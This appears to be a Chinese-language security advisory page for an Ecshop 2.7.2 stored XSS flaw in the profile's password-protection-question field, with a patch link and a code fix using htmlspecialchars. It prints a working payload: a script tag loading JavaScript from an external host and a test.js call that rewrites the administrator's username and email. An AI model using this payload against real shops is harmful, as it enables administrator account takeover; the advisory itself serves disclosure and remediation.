<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META NAME="generator" CONTENT="http://txt2tags.sf.net">
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<LINK REL="stylesheet" TYPE="text/css" HREF="http://shopexts.googlecode.com/files/vul.css">
<TITLE>Ecshop2.7.2个人资料输入过滤不严</TITLE>
</HEAD>
<BODY>

<DIV CLASS="header" ID="header">
<H1>Ecshop2.7.2个人资料输入过滤不严</H1>
<H2>last modify 2011-07-20 15:27:19 Wednesday</H2>
</DIV>

<DIV CLASS="body" ID="body">
<H4>添加时间</H4>
<P>
2010-09-19
</P>
<H4>系统编号</H4>
<P>
SEC10091902
</P>
<H4>影响版本</H4>
<P>
Ecshop2.7.2
</P>
<H4>漏洞危害</H4>
<P>
个人资料修改时，Javascript代码过滤不够严格，XSS代码直接进入数据库，可获得管理员帐号。
</P>
<H4>漏洞原理</H4>
<P>
截图
</P>
<P>
          <IMG ALIGN="right" SRC="http://www.wooyun.org/upload/201009/201529321175f23b62d70f7033e2f001546c236f.jpg" BORDER="0" ALT="">
</P>
<P>
密码保护问题这一项，没有使用正则过滤，其他的的都有正则过滤。我们可以在密码保护问题里输入XSS，但是后台查看会员资料是不显示密码保护问题的，所以这里必须要网站后台添加了新的 “会员注册项”时，后台查看资料就会显示了，此处填入一段引入外部js的代码:
</P>
<PRE>
"&gt;&lt;script src="http://www.***.com/test.js" type="text/javascript"&gt;&lt;/script&gt;
</PRE>
<P></P>
<P>
外部test.js文件内容如下
</P>
<PRE>
Ajax.call('privilege.php?act=update','id=1&amp;user_name=heihei&amp;email=10001@qq.com','',"POST","JSON");
</PRE>
<P></P>
<H4>检测方法</H4>
<P>
          <IMG ALIGN="right" SRC="http://www.wooyun.org/upload/201009/20153929b9ac1abec66d6b3f56c033e3c0ed690b.jpg" BORDER="0" ALT="">
</P>
<P>
          <IMG ALIGN="right" SRC="http://www.wooyun.org/upload/201009/201535039fb2c3af66dad10a97acf9d8b3b5958b.jpg" BORDER="0" ALT="">
</P>
<H4>解决方案</H4>
<P>
1）补丁下载地址
</P>
<P>
<A HREF="http://downtcom.shopex.cn/update/sec10091901.zip">http://downtcom.shopex.cn/update/sec10091901.zip</A>
</P>
<P>
2）如果要自行修复，请将/core/api/include/api_link.php
</P>
<P>
程序的504行
</P>
<PRE>
$temp_field_content = strlen($_POST[$extend_field_index]) &gt; 100 ? mb_substr($_POST[$extend_field_index], 0, 99) : $_POST[$extend_field_index];
</PRE>
<P></P>
<P>
修改为
</P>
<PRE>
$temp_field_content = strlen($_POST[$extend_field_index]) &gt; 100 ? mb_substr(htmlspecialchars($_POST[$extend_field_index]), 0, 99) : htmlspecialchars($_POST[$extend_field_index]);
</PRE>
<P></P>
<H4>信息来源</H4>
<P>
WooYun.org
</P>
<P>
<A HREF="http://www.wooyun.org/bug.php?action=view&amp;id=581">http://www.wooyun.org/bug.php?action=view&amp;id=581</A>
</P>
</DIV>

<!-- html code generated by txt2tags 2.5 (http://txt2tags.sf.net) -->
<!-- cmdline: txt2tags -\-target=html -\-infile=t2t/10091902.t2t -\-outfile=htdocs/10091902.html -->
</BODY></HTML>
